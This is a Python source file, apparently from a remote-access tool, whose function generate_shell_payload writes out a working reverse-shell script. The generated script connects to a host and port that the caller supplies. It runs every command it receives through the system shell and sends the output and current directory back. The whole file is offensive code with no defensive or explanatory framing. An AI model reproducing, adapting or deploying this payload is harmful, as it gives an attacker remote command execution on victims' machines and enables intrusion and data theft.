# Functions for generating payloads

def generate_shell_payload(host, port, path):
 
    shell_payload = """from subprocess import check_output
import socket
import time
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('""" + host + """', """ + port + """))

s.send(os.getcwd().encode('utf-8'))

while True:
    command = s.recv(2048).decode('utf-8')
    try:
        output = str(check_output(command, shell=True)).replace("\\\\n", "\\n").replace("\\\\r", "").replace("\\\\\\\\", "\\\\")[2:-1]
        if command.split(" ", 1)[0] == "cd":
            os.chdir(command.split(" ", 1)[1])
        time.sleep(0.05)
        s.send(f"CWD {os.getcwd()}".encode('utf-8'))
        if output == "":
            time.sleep(0.05)
            s.send("  MESSAGE END".encode('utf-8'))
        else:
            time.sleep(0.05)
            s.send(f"{output}  MESSAGE END".encode('utf-8'))
    except:
        time.sleep(0.05)
        s.send(f"CWD {os.getcwd()}".encode('utf-8'))
        time.sleep(0.05)
        s.send("error MESSAGE END".encode('utf-8'))"""
  
    with open(path, 'w') as file:
  
        file.write(shell_payload)